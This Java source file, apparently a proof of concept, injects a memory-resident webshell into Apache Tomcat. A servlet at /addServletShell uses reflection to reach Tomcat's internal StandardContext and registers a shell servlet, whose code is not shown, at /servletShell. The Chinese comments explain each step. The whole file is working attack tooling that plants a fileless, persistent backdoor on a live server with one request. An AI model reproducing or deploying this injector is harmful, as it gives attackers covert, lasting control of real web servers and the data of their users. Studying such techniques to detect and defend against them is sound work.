package com.tomcatmemshell.servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet("/addServletShell")
public class ServletMemshell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            // 先拿到 ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            // 从 ServletContext 里面拿到 ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx = applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            // 从 ApplicationContext 里面拿到 StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            // 准备内存马
            ServletShell shell = new ServletShell();

            // 用 wrapper 包装内存马
            Wrapper wrapper = new StandardWrapper();

            // 设置 servlet 的作用类以及作用路径
            // wrapper.setServlet 和 wrapper.setServletClass 都可以设置 servlet 的作用类，在 tomcat 中使用的是后者
            wrapper.setServlet(shell);
            wrapper.setName("servletShell");
            //  wrapper.setServletClass(shell.getClass().getName());

            // 添加到标准上下文
            standardContext.addChild(wrapper);

            // 添加映射关系
            standardContext.addServletMappingDecoded("/servletShell", "servletShell");

            resp.getWriter().write("add success!");
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
